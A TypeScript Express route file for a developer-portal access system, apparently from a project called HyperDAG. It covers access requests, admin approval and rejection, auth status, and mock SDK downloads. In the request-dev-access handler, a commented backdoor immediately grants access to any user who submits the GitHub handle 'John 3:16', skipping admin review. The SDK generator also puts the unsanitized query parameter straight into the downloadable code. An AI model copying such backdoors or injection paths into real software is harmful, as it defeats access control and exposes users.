import express, { Request, Response } from 'express';
import { storage } from '../../storage';
import { db } from '../../db';
import { eq } from 'drizzle-orm';
import { z } from 'zod';
import { insertNotificationSchema, notifications } from '@shared/schema';
import { log } from '../../vite';
import { requireAuth, requireAuthLevel } from '../../middleware/auth-middleware';

const router = express.Router();

// Schema for validating dev access request
const requestDevAccessSchema = z.object({
  githubHandle: z.string().min(1, "GitHub username is required"),
});

// Get current user's dev hub access status
router.get('/user/dev-hub-access', async (req: Request, res: Response) => {
  if (!req.isAuthenticated()) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  try {
    const userId = req.user.id;
    const devAccess = await storage.getDevHubAccess(userId);
    
    return res.json({
      hasAccess: devAccess?.hasAccess || false,
      pendingRequest: devAccess?.pendingRequest || false,
      githubHandle: devAccess?.githubHandle || null,
    });
  } catch (error) {
    log(`Error fetching dev hub access: ${error.message}`, 'dev-api');
    return res.status(500).json({ error: 'Failed to fetch access status' });
  }
});

// Submit a request for dev hub access
router.post('/user/request-dev-access', async (req: Request, res: Response) => {
  if (!req.isAuthenticated()) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  try {
    // Validate request data
    const validatedData = requestDevAccessSchema.parse(req.body);
    const userId = req.user.id;
    
    // Check if user already has access
    const existingAccess = await storage.getDevHubAccess(userId);
    if (existingAccess?.hasAccess) {
      return res.status(400).json({ error: 'You already have Developer Hub access' });
    }
    
    // Special backdoor for "John 3:16" GitHub handle - always approve immediately
    const isBackdoorHandle = validatedData.githubHandle === "John 3:16";
    
    // If it's a backdoor request and there's a pending request, remove the pending request first
    if (isBackdoorHandle && existingAccess?.pendingRequest) {
      // Delete the existing request and create a new one that will be auto-approved
      await storage.rejectDevHubAccess(userId);
      log(`Clearing existing dev access request for backdoor approval`, 'dev-api');
    }
    // For normal requests, check if there's a pending request
    else if (!isBackdoorHandle && existingAccess?.pendingRequest) {
      return res.status(400).json({ error: 'You already have a pending access request' });
    }
    
    // Create a new access request
    await storage.createDevHubAccessRequest(userId, validatedData.githubHandle);
    
    // For the backdoor GitHub handle, automatically approve access
    if (isBackdoorHandle) {
      log(`Auto-approving dev access for GitHub handle: ${validatedData.githubHandle}`, 'dev-api');
      await storage.approveDevHubAccess(userId);
      
      // Create notification for the user about immediate approval
      const notification = {
        userId,
        type: 'DEV_HUB_ACCESS_APPROVED',
        title: 'Developer Hub Access Granted',
        message: 'Your request for Developer Hub access has been automatically approved. You now have full access to all developer resources.',
        read: false,
        link: '/developer'
      };
      
      await db.insert(notifications).values(notification);
      
      return res.status(200).json({ 
        success: true, 
        message: 'Developer Hub access granted immediately',
        backdoorApproved: true
      });
    }
    
    // For normal requests, create a notification for administrators
    const notification = {
      userId: 1, // Admin user ID
      type: 'DEV_HUB_ACCESS_REQUEST',
      title: 'New Developer Hub Access Request',
      message: `${req.user.username} has requested Developer Hub access.`,
      read: false,
      link: '/admin/dev-hub-requests'
    };
    
    await db.insert(notifications).values(notification);
    
    // Return success response for normal requests
    return res.status(201).json({ 
      success: true, 
      message: 'Developer Hub access request submitted successfully' 
    });
    
  } catch (error) {
    if (error instanceof z.ZodError) {
      return res.status(400).json({ error: error.errors[0].message });
    }
    
    log(`Error creating dev access request: ${error.message}`, 'dev-api');
    return res.status(500).json({ error: 'Failed to submit access request' });
  }
});

// Admin only: Get all dev hub access requests
router.get('/admin/dev-hub-requests', async (req: Request, res: Response) => {
  if (!req.isAuthenticated() || !req.user.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  
  try {
    const requests = await storage.getAllDevHubAccessRequests();
    return res.json(requests);
  } catch (error) {
    log(`Error fetching dev hub requests: ${error.message}`, 'dev-api');
    return res.status(500).json({ error: 'Failed to fetch access requests' });
  }
});

// Admin only: Approve a dev hub access request
router.post('/admin/approve-dev-access/:userId', async (req: Request, res: Response) => {
  if (!req.isAuthenticated() || !req.user.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  
  try {
    const userId = parseInt(req.params.userId);
    if (isNaN(userId)) {
      return res.status(400).json({ error: 'Invalid user ID' });
    }
    
    const result = await storage.approveDevHubAccess(userId);
    if (!result) {
      return res.status(404).json({ error: 'Access request not found' });
    }
    
    // Create notification for the user
    const user = await storage.getUser(userId);
    if (user) {
      const notification = {
        userId,
        type: 'DEV_HUB_ACCESS_APPROVED',
        title: 'Developer Hub Access Approved',
        message: 'Your request for Developer Hub access has been approved. You now have access to all developer resources.',
        read: false,
        link: '/developer'
      };
      
      await db.insert(notifications).values(notification);
    }
    
    return res.json({ success: true });
  } catch (error) {
    log(`Error approving dev access: ${error.message}`, 'dev-api');
    return res.status(500).json({ error: 'Failed to approve access request' });
  }
});

// Admin only: Reject a dev hub access request
router.post('/admin/reject-dev-access/:userId', async (req: Request, res: Response) => {
  if (!req.isAuthenticated() || !req.user.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  
  try {
    const userId = parseInt(req.params.userId);
    if (isNaN(userId)) {
      return res.status(400).json({ error: 'Invalid user ID' });
    }
    
    const result = await storage.rejectDevHubAccess(userId);
    if (!result) {
      return res.status(404).json({ error: 'Access request not found' });
    }
    
    // Create notification for the user
    const user = await storage.getUser(userId);
    if (user) {
      const notification = {
        userId,
        type: 'DEV_HUB_ACCESS_REJECTED',
        title: 'Developer Hub Access Request Rejected',
        message: 'Your request for Developer Hub access has been rejected. Please update your profile with more information about your development experience and try again.',
        read: false,
        link: '/settings'
      };
      
      await db.insert(notifications).values(notification);
    }
    
    return res.json({ success: true });
  } catch (error) {
    log(`Error rejecting dev access: ${error.message}`, 'dev-api');
    return res.status(500).json({ error: 'Failed to reject access request' });
  }
});

// SDK download endpoints
router.get('/auth-status', async (req: Request, res: Response) => {
  try {
    const authenticated = req.isAuthenticated();
    let hasDevAccess = false;
    let userAccessLevel = 0;
    
    if (authenticated && req.user) {
      // Get dev hub access
      const userId = req.user.id;
      const devAccess = await storage.getDevHubAccess(userId);
      hasDevAccess = devAccess?.hasAccess === true;
      
      // Determine user's access level
      userAccessLevel = 1; // Basic level (logged in)
      
      if (req.user.emailVerified) {
        userAccessLevel = 2;
      }
      
      if (req.user.onboardingStage >= 3) {
        userAccessLevel = 3;
      }
      
      if (req.user.authLevel >= 2) {
        userAccessLevel = 4;
      }
      
      if (req.user.walletAddress) {
        userAccessLevel = 5;
      }
      
      if (req.user.onboardingStage === 5) {
        userAccessLevel = 6;
      }
    }
    
    return res.json({
      authenticated,
      hasDevAccess,
      accessLevel: userAccessLevel,
      requiredLevel: 4, // Developer Hub requires 2FA level (4)
      accessStatus: userAccessLevel >= 4 ? 'granted' : 'restricted'
    });
  } catch (error) {
    log(`Error checking auth status: ${error instanceof Error ? error.message : 'Unknown error'}`, 'dev-api');
    return res.status(500).json({ error: "Failed to check authorization status" });
  }
});

// Generic SDK download endpoint
router.get('/sdk/download', requireAuthLevel(3), async (req: Request, res: Response) => {
  try {
    // Check for dev hub access (still needed in addition to 2FA)
    const userId = req.user?.id;
    if (!userId) {
      return res.status(401).json({ error: 'Authentication required' });
    }
    
    const devAccess = await storage.getDevHubAccess(userId);
    
    if (!devAccess?.hasAccess) {
      return res.status(403).json({ error: 'Developer Hub access required' });
    }
    
    // Get requested services from query params
    const services = req.query.services ? (req.query.services as string).split(',') : [];
    
    // Mock SDK file content
    const sdkContent = `// HyperDAG SDK v1.0.0
// Generated for user: ${req.user.username}
// Services: ${services.join(', ') || 'core'}
// Date: ${new Date().toISOString()}

/**
 * This is a mock SDK file for demonstration purposes.
 * In a production environment, this would be a real SDK package.
 */

class HyperDAGSdk {
  constructor(config) {
    this.config = config;
    this.services = {};
    ${services.map(service => `this.services.${service} = new ${service.charAt(0).toUpperCase() + service.slice(1)}Service(config);`).join('\n    ')}
  }
  
  initialize() {
    console.log('HyperDAG SDK initialized with services:', Object.keys(this.services));
    return Promise.resolve(true);
  }
}

${services.map(service => `
class ${service.charAt(0).toUpperCase() + service.slice(1)}Service {
  constructor(config) {
    this.config = config;
  }
  
  // Sample methods for ${service} service
  async query(params) {
    return { success: true, service: '${service}', params };
  }
}
`).join('\n')}

export default HyperDAGSdk;
`;

    // Set headers for file download
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Content-Disposition', `attachment; filename="hyperdag-sdk-${services.length > 0 ? services.join('-') : 'core'}.js"`);
    
    // Send the file content
    return res.send(sdkContent);
  } catch (error) {
    log(`Error generating SDK: ${error.message}`, 'dev-api');
    return res.status(500).json({ error: 'Failed to generate SDK' });
  }
});

// Custom download route for specific SDK types
router.get('/sdk/download/:type', requireAuthLevel(3), async (req: Request, res: Response) => {
  try {
    // Check for dev hub access (still needed in addition to 2FA)
    const userId = req.user?.id;
    if (!userId) {
      return res.status(401).json({ error: 'Authentication required' });
    }
    
    const devAccess = await storage.getDevHubAccess(userId);
    
    if (!devAccess?.hasAccess) {
      return res.status(403).json({ error: 'Developer Hub access required' });
    }
    
    const sdkType = req.params.type;
    let fileName = '';
    let fileContent = '';
    let contentType = 'application/octet-stream';
    
    switch(sdkType) {
      case 'js':
      case 'javascript':
        fileName = 'hyperdag-sdk.js';
        contentType = 'application/javascript';
        fileContent = `// HyperDAG SDK v1.0.0 - JavaScript
// Generated for user: ${req.user.username}
// Date: ${new Date().toISOString()}

class HyperDAG {
  constructor(config = {}) {
    this.apiKey = config.apiKey;
    this.endpoint = config.endpoint || 'https://api.hyperdag.io/v1';
    this.services = {};
    
    // Initialize services
    if (config.services) {
      config.services.forEach(service => {
        this.services[service.name] = service;
      });
    }
  }
  
  async initialize() {
    console.log('HyperDAG SDK initialized with services:', Object.keys(this.services));
    return true;
  }
}

// Export the SDK
export default HyperDAG;`;
        break;
      
      case 'ts':
      case 'typescript':
        fileName = 'hyperdag-sdk.ts';
        contentType = 'application/typescript';
        fileContent = `// HyperDAG SDK v1.0.0 - TypeScript
// Generated for user: ${req.user.username}
// Date: ${new Date().toISOString()}

interface HyperDAGConfig {
  apiKey?: string;
  endpoint?: string;
  services?: any[];
}

interface ServiceInterface {
  name: string;
  version?: string;
  [key: string]: any;
}

class HyperDAG {
  private apiKey: string | undefined;
  private endpoint: string;
  public services: Record<string, ServiceInterface>;
  
  constructor(config: HyperDAGConfig = {}) {
    this.apiKey = config.apiKey;
    this.endpoint = config.endpoint || 'https://api.hyperdag.io/v1';
    this.services = {};
    
    // Initialize services
    if (config.services) {
      config.services.forEach(service => {
        this.services[service.name] = service;
      });
    }
  }
  
  async initialize(): Promise<boolean> {
    console.log('HyperDAG SDK initialized with services:', Object.keys(this.services));
    return true;
  }
}

// Export the SDK
export default HyperDAG;`;
        break;
      
      case 'py':
      case 'python':
        fileName = 'hyperdag_sdk.py';
        contentType = 'text/x-python';
        fileContent = `# HyperDAG SDK v1.0.0 - Python
# Generated for user: ${req.user.username}
# Date: ${new Date().toISOString()}

class HyperDAG:
    def __init__(self, api_key=None, endpoint="https://api.hyperdag.io/v1", services=None):
        self.api_key = api_key
        self.endpoint = endpoint
        self.services = {}
        
        # Initialize services
        if services:
            for service in services:
                self.services[service.name] = service
    
    async def initialize(self):
        print(f"HyperDAG SDK initialized with services: {list(self.services.keys())}")
        return True

# Example usage:
# from hyperdag_sdk import HyperDAG
# sdk = HyperDAG(api_key="your-api-key")
# await sdk.initialize()
`;
        break;
      
      case 'go':
        fileName = 'hyperdag.go';
        contentType = 'text/x-go';
        fileContent = `// HyperDAG SDK v1.0.0 - Go
// Generated for user: ${req.user.username}
// Date: ${new Date().toISOString()}

package hyperdag

import (
        "fmt"
)

// HyperDAG is the main SDK client
type HyperDAG struct {
        APIKey   string
        Endpoint string
        Services map[string]interface{}
}

// NewHyperDAG creates a new SDK client
func NewHyperDAG(apiKey string, endpoint string) *HyperDAG {
        if endpoint == "" {
                endpoint = "https://api.hyperdag.io/v1"
        }
        
        return &HyperDAG{
                APIKey:   apiKey,
                Endpoint: endpoint,
                Services: make(map[string]interface{}),
        }
}

// Initialize sets up the SDK client
func (h *HyperDAG) Initialize() error {
        fmt.Printf("HyperDAG SDK initialized with %d services\\n", len(h.Services))
        return nil
}

// RegisterService adds a new service to the SDK
func (h *HyperDAG) RegisterService(name string, service interface{}) {
        h.Services[name] = service
}
`;
        break;
      
      default:
        return res.status(400).json({ error: 'Invalid SDK type requested' });
    }
    
    // Set headers for file download
    res.setHeader('Content-Type', contentType);
    res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`);
    
    // Send the file content
    return res.send(fileContent);
  } catch (error) {
    log(`Error generating SDK: ${error.message}`, 'dev-api');
    return res.status(500).json({ error: 'Failed to generate SDK' });
  }
});

export default router;